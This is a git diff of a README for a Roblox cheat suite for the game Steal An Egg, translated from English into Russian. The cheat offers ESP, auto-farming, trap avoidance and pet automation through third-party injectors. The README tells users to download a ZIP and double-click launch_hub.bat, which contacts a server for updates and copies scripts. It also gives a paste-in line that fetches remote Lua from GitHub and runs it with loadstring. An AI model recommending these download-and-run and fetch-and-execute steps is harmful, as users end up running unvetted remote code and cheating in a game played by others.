@@ -1,60 +1,61 @@
-# Steal-An-Egg Framework & Automation Suite
+# Фреймворк и Автоматизация Steal-An-Egg
 
-An advanced multi-executor framework for **Steal An Egg** featuring visual diagnostics, intelligent pathing, auto-farming routines, and companion tooling.
+Мульти-экзекуторный комплекс для **Steal An Egg** (Roblox), включающий визуальные инструменты (ESP), адаптивную навигацию, авто-фарм и хост-синхронизатор.
 
-[![Download ZIP](https://img.shields.io/badge/Download-Steal--An--Egg%20v2.4.1%20(Full%20Bundle)-2ea44f?style=for-the-badge&logo=github)](https://github.com/aether-bytess/Steal-An-Egg/releases/download/v2.4.1/Steal-An-Egg-v2.4.1.zip)
-
----
-
-## ⚡ Features
-
-- **Dynamic Visuals (ESP):** Bounding box rendering, distance indicators, trap radar, and treadmill vectors.
-- **Autonomous Farm Loop:** Priority-based egg targeting, inventory capacity checks, base pen returns, and automated deposits.
-- **Obstacle Avoidance:** Navigation mesh solver to avoid hostile zones, user-placed traps, and treadmills.
-- **Pet Automation:** Auto-hatch logic, best-in-slot equipment manager, and pet fusing routines.
-- **Custom UI System:** Multi-tab interactive GUI with persistent state toggles, draggable viewport, and keybind toggle (`G`).
+[![Скачать ZIP](https://img.shields.io/badge/Скачать-Steal--An--Egg%20v2.4.1%20(Архив)-2ea44f?style=for-the-badge&logo=github)](https://github.com/aether-bytess/Steal-An-Egg/releases/download/v2.4.1/Steal-An-Egg-v2.4.1.zip)
 
 ---
 
-## 🚀 Execution Methods
+## ⚡ Возможности комплекса
 
-| Method | Setup | Highlights |
+- **Визуализация (ESP):** Отрисовка 2D/3D боксов яиц, индикация дистанции, векторы движения дорожек и радар ловушек.
+- **Автономный цикл фарма:** Интеллектуальный выбор самых редких яиц, контроль вместимости инвентаря, возврат на базу и сдача.
+- **Обход препятствий:** A* алгоритм поиска пути в обход враждебных зон, ловушек других игроков и замедляющих дорожек.
+- **Автоматизация питомцев:** Авто-высиживание, авто-экипировка сильнейших питомцев и скрещивание одинаковых.
+- **Удобный интерфейс:** Полностью русифицированное окно с переключателями, защитой от сбоев (`xpcall`), перетаскиванием и горячей клавишей (`G`).
+
+---
+
+## 🚀 Способы запуска
+
+| Способ | Настройка | Особенности |
 |---|---|---|
-| **[Option 2: Local Launcher](#option-2-local-workspace-loader-recommended)** *(Recommended)* | 1-Click ZIP + `launch_hub.bat` | Auto-sync to all executors, zero network throttling |
-| **[Option 1: Cloud Loader](#option-1-direct-web-loader-cloud)** | Paste single URL | Quick cloud execution |
+| **[Способ 2: Локальный лаунчер](#способ-2-локальный-запуск-через-лаунчер-рекомендуется)** *(Рекомендуется)* | Скачать архив + `launch_hub.bat` | Авто-синхронизация со всеми экзекуторами, отсутствие лимитов |
+| **[Способ 1: Облачный загрузчик](#способ-1-облачный-загрузчик)** | Вставить одну строку | Быстрый облачный запуск |
 
 ---
 
-### Option 2: Local Workspace Loader (Recommended)
+### Способ 2: Локальный запуск через лаунчер (Рекомендуется)
 
-[![Download ZIP](https://img.shields.io/badge/⬇️_Download_Full_Bundle_v2.4.1-Click_Here-blue?style=for-the-badge)](https://github.com/aether-bytess/Steal-An-Egg/releases/download/v2.4.1/Steal-An-Egg-v2.4.1.zip)
+[![Скачать ZIP](https://img.shields.io/badge/⬇️_Скачать_Готовый_Архив_v2.4.1-Кликните_Сюда-blue?style=for-the-badge)](https://github.com/aether-bytess/Steal-An-Egg/releases/download/v2.4.1/Steal-An-Egg-v2.4.1.zip)
 
 #### Пошаговая инструкция (3 шага):
-1. **Скачайте архив:** Нажмите [Скачать Steal-An-Egg-v2.4.1.zip](https://github.com/aether-bytess/Steal-An-Egg/releases/download/v2.4.1/Steal-An-Egg-v2.4.1.zip) и распакуйте папку в любое место на компьютере.
+1. **Скачайте архив:** Нажмите [Скачать Steal-An-Egg-v2.4.1.zip](https://github.com/aether-bytess/Steal-An-Egg/releases/download/v2.4.1/Steal-An-Egg-v2.4.1.zip) и распакуйте папку на компьютер.
 2. **Запустите лаунчер:** Дважды кликните по файлу `launch_hub.bat`.
-   - Лаунчер сам найдет установленные инжекторы (**Real**, **Solara**, **Wave**, **Celery**, **Potassium** и др.).
-   - Автоматически скопирует нужные файлы в папку `workspace` вашего экзекутора.
+   - Лаунчер проверит наличие обновлений на сервере.
+   - Автоматически найдет установленные инжекторы (**Real**, **Solara**, **Wave**, **Celery**, **Potassium** и др.).
+   - Скопирует скрипты в папку `workspace` вашего экзекутора.
    - **Автоматически скопирует команду запуска в буфер обмена**.
-3. **Запустите в игре:** Зайдите в Steal An Egg в Roblox, откройте свой экзекутор, нажмите **Ctrl + V** (вставить) и нажмите **Execute**:
+3. **Запустите в игре:** Откройте Roblox, зайдите в Steal An Egg, в окне экзекутора нажмите **Ctrl + V** (вставить) и нажмите **Execute**:
 ```lua
 getgenv().__COMPANION_ACTIVE = true; loadstring(readfile("Steal-An-Egg/StealAnEgg.lua"))()
 ```
-Нажмите **G** в игре, чтобы открыть/закрыть меню.
+Нажмите клавишу **G** в игре для открытия или закрытия меню.
 
 ---
 
-### Option 1: Direct Web Loader (Cloud)
-Если у вас нет возможности распаковать архив, вставьте этот скрипт напрямую в экзекутор:
+### Способ 1: Облачный загрузчик
+Если у вас нет возможности распаковать архив на ПК, вставьте эту строку в экзекутор:
 ```lua
 loadstring(game:HttpGet("https://raw.githubusercontent.com/aether-bytess/Steal-An-Egg/refs/heads/main/StealAnEgg.lua"))()
 ```
-*(Примечание: если локальные файлы не найдены, скрипт покажет окно с предложением использовать Способ 2 для полной стабильности).*
+*(Внимание: при облачном запуске скрипт отобразит окно с инструкцией по переходу на Способ 2 для загрузки полных компонентов).*
 
 ---
 
-## 🛠️ Supported Executors
+## 🛠️ Поддерживаемые экзекуторы
 
-Протестировано и подтверждено на популярных экзекуторах:
+Проверено на популярных средах исполнения:
 - **Real / RealExecutor**
 - **Potassium / Ro-Exec**
 - **Solara**
@@ -65,24 +66,19 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/aether-bytess/Steal-A
 
 ---
 
-## 📁 Repository Structure
+## 📁 Структура проекта
 
 ```text
-├── StealAnEgg.lua         # Universal cloud & local UI hub
-├── hub_loader.lua         # Unified modular loader
-├── run.lua                # Standalone single-chunk runtime
-├── launch_hub.bat         # Host bootstrapper launcher (Double-click)
-├── launch_hub.ps1         # Multi-executor workspace synchronizer
-├── EggESP/                # Core automation, navigation & ESP modules
-│   ├── automation/        # Auto-farm, movement, pet logic
-│   ├── core/              # Config, diagnostics, filters
-│   ├── esp/               # Renderer, bounding boxes, data collectors
-│   ├── navigation/        # A* pathfinding and vector solver
-│   └── ui/                # Interface components and themes
-└── README.md
+├── StealAnEgg.lua         # Главный графический хаб на русском языке
+├── hub_loader.lua         # Модульный загрузчик
+├── run.lua                # Автономный загрузчик для readfile
+├── launch_hub.bat         # Лаунчер для запуска в 1 клик
+├── launch_hub.ps1         # Скрипт синхронизации рабочих областей экзекуторов
+├── EggESP/                # Внутренние модули логики, навигации и ESP
+│   ├── automation/        # Модули авто-фарма и питомцев
+│   ├── core/              # Конфигурации и диагностика
+│   ├── esp/               # Отрисовка визуала
+│   ├── navigation/        # Алгоритм обхода ловушек и поиска пути
+│   └── ui/                # Темы оформления
+└── README.md              # Документация проекта
 ```
-
----
-
-## 📄 License & Notes
-Developed for personal research and private automation testing.
